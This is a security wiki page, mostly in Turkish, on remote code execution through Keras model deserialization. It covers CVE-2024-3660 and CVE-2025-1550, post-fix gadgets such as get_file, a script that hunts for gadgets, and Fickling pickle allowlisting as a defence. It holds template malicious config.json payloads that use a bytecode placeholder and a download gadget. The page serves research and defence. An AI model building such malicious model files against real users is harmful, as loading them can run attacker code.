# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, Keras model deserialization pipeline'ına yönelik pratik exploitation techniques'i özetler, yerel .keras formatının iç yapısını ve attack surface'ını açıklar ve Model File Vulnerabilities (MFVs) ve post-fix gadgets bulmak için araştırmacılara bir toolkit sağlar.

## .keras model format iç yapısı

A .keras dosyası en az aşağıdakileri içeren bir ZIP arşividir:
- metadata.json – genel bilgi (ör. Keras sürümü)
- config.json – model mimarisi (primary attack surface)
- model.weights.h5 – HDF5 içinde ağırlıklar

config.json recursive deserialization'ı tetikler: Keras modülleri import eder, sınıf/fonksiyonları çözer ve attacker-controlled dictionaries'ten katmanları/nesneleri yeniden oluşturur.

Dense katman nesnesi için örnek snippet:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization performs:
- module/class_name anahtarlarından module import ve sembol çözümlemesi
- from_config(...) veya constructor çağrısı; kwargs attacker tarafından kontrol edilir
- İç içe nesnelere özyineleme (activations, initializers, constraints, vb.)

Historically, this exposed three primitives to an attacker crafting config.json:
- Hangi modüllerin import edildiğinin kontrolü
- Hangi classes/functions çözümlendiğinin kontrolü
- Constructors/from_config içine geçirilen kwargs'ların kontrolü

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config() python_utils.func_load(...) kullanıyordu; bu, attacker tarafından sağlanan baytları base64-decode edip marshal.loads() çağırıyordu; Python'un unmarshalling işlemi kod çalıştırabilir.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Azaltma:
- Keras varsayılan olarak safe_mode=True uygular. Lambda içindeki serileştirilmiş Python fonksiyonları, kullanıcı açıkça safe_mode=False ile devre dışı bırakmadıkça engellenir.

Notlar:
- Legacy formatlar (eski HDF5 kayıtları) veya daha eski kod tabanları modern kontrolleri zorlamayabilir, bu yüzden “downgrade” tarzı saldırılar kurbanlar eski yükleyicileri kullandığında hâlâ geçerli olabilir.

## CVE-2025-1550 – Keras ≤ 3.8'de keyfi modül importu

Kök neden:
- _retrieve_class_or_fn, config.json'dan saldırgan kontrollü modül dizeleriyle sınırlama getirilmemiş importlib.import_module()'ü kullandı.
- Etkisi: Herhangi bir yüklü modülün (veya sys.path üzerinde saldırgan tarafından yerleştirilmiş bir modülün) keyfi import edilmesi. Import sırasında kod çalışır; ardından nesne oluşturulması saldırganın verdiği kwargs ile gerçekleşir.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Güvenlik iyileştirmeleri (Keras ≥ 3.9):
- Module allowlist: importlar resmi ekosistem modülleriyle sınırlı: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True, unsafe Lambda serialized-function loading'i engeller
- Basic type checking: deserileştirilmiş nesneler beklenen türlerle eşleşmelidir

## Post-fix gadget yüzeyi allowlist içinde

Allowlisting ve safe mode etkin olsa bile, izin verilen Keras callable'ları arasında geniş bir yüzey kalır. Örneğin, keras.utils.get_file keyfi URL'leri kullanıcı tarafından seçilebilen konumlara indirebilir.

İzin verilen bir fonksiyona referans veren Lambda aracılığıyla Gadget (not serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Önemli sınırlama:
- Lambda.call() hedef callable'ı çağırırken input tensor'ı ilk pozisyonel argüman olarak öne ekler. Seçilen gadget'ların fazladan bir pozisyonel argümanı tolere etmesi (veya *args/**kwargs kabul etmesi) gerekir. Bu, hangi fonksiyonların kullanılabilir olduğunu kısıtlar.

Potential impacts of allowlisted gadgets:
- Keyfi indirme/yazma (path planting, config poisoning)
- Ortama bağlı olarak Network callbacks/SSRF-like etkiler
- Yazılan yollar daha sonra import/execute edilirse veya PYTHONPATH'e eklenirse ya da yazılabilir bir execution-on-write konumu varsa kod yürütmeye zincirlenme

## Araştırmacı araçları

1) İzin verilen modüllerde sistematik gadget keşfi

keras, keras_nlp, keras_cv, keras_hub genelinde aday callables'ları listeleyin ve file/network/process/env side effects'e sahip olanları önceliklendirin.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Doğrudan deserileştirme testi (.keras arşivi gerekmez)

Özenle hazırlanmış dicts'leri doğrudan Keras deserileştiricilere vererek kabul edilen parametreleri öğrenin ve yan etkileri gözlemleyin.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Çapraz sürüm testleri ve formatlar

Keras, farklı koruma önlemleri ve formatlarla birden fazla kod tabanında/dönemde mevcuttur:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: ayrı olarak bakılıyor
- Multi-backend Keras 3 (official): introduced native .keras

Regresyonları veya eksik korumaları ortaya çıkarmak için testleri kod tabanları ve formatlar (.keras vs legacy HDF5) arasında tekrarlayın.

## Savunma önerileri

- Model dosyalarını güvensiz giriş olarak kabul edin. Modelleri yalnızca güvenilir kaynaklardan yükleyin.
- Keras'ı güncel tutun; allowlisting ve tip kontrollerinden yararlanmak için Keras ≥ 3.9 kullanın.
- Dosyaya tamamen güvenmiyorsanız modelleri yüklerken safe_mode=False ayarlamayın.
- Deserializasyonu ağ çıkışı olmayan ve dosya sistemi erişimi kısıtlı, sandbox'lanmış, en az ayrıcalıklı bir ortamda çalıştırmayı düşünün.
- Mümkün olduğunda model kaynakları için allowlists/signatures ve bütünlük denetimini uygulayın.

## ML pickle import allowlisting for AI/ML models (Fickling)

Birçok AI/ML model formatı (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, eski TensorFlow artifaktları, vb.) Python pickle verisi gömer. Saldırganlar rutin olarak pickle GLOBAL importlarını ve nesne yapıcılarını yükleme sırasında RCE veya model değiştirme gerçekleştirmek için kötüye kullanır. Kara liste tabanlı tarayıcılar genellikle yeni veya listelenmemiş tehlikeli importları kaçırır.

Pratik, fail-closed bir savunma, Python’un pickle deserializer’ını hook’lamak ve unpickling sırasında yalnızca incelenmiş, zararsız ML ile ilgili importlar kümesine izin vermektir. Trail of Bits’ Fickling bu politikayı uygular ve binlerce kamuya açık Hugging Face pickles’ından oluşturulmuş düzenlenmiş bir ML import allowlist ile gelir.

“Güvenli” importlar için güvenlik modeli (araştırma ve uygulamadan süzülmüş sezgiler): pickle tarafından kullanılan import edilen semboller aynı anda şu şartları sağlamalıdır:
- Kod çalıştırmamalı veya çalıştırmaya neden olmamalı (derlenmiş/kaynak kod nesneleri, shelling out, hooks, vb. olmamalı)
- Herhangi bir özniteliği veya öğeyi rastgele alıp ayarlamamalı
- pickle VM’den diğer Python nesnelerine referans import etmemeli veya elde etmemeli
- Dolaylı bile olsa hiçbir ikincil deserializer’ı tetiklememeli (ör. marshal, nested pickle)

Fickling’in korumalarını sürecin başlangıcında olabildiğince erken etkinleştirin, böylece framework’ler tarafından yapılan herhangi bir pickle yüklemesi (torch.load, joblib.load, vb.) kontrol edilir:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operasyonel ipuçları:
- Gerekli olduğunda hooks'ları geçici olarak devre dışı bırakıp yeniden etkinleştirebilirsiniz:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Eğer bilinen güvenilir bir model engellendiyse, simgeleri gözden geçirdikten sonra ortamınız için allowlist'i genişletin:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling ayrıca daha ayrıntılı kontrol tercih ediyorsanız genel çalışma zamanı korumaları da sağlar:
- fickling.always_check_safety() tüm pickle.load() için kontrolleri zorlamak amacıyla
- with fickling.check_safety(): sınırlı kapsamda zorlamalar için
- fickling.load(path) / fickling.is_likely_safe(path) tek seferlik kontroller için

- Mümkünse non-pickle model formatlarını tercih edin (ör. SafeTensors). Eğer pickle kabul etmek zorundaysanız, loader'ları en az ayrıcalıkla, ağ çıkışı olmadan çalıştırın ve allowlist'i uygulayın.

Bu allowlist-öncelikli strateji, uyumluluğu yüksek tutarken yaygın ML pickle istismar yollarını açıkça engeller. ToB’nin benchmark'ında Fickling sentetik kötü amaçlı dosyaların %100'ünü işaretledi ve üst düzey Hugging Face depolarından temiz dosyaların yaklaşık %99'una izin verdi.

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
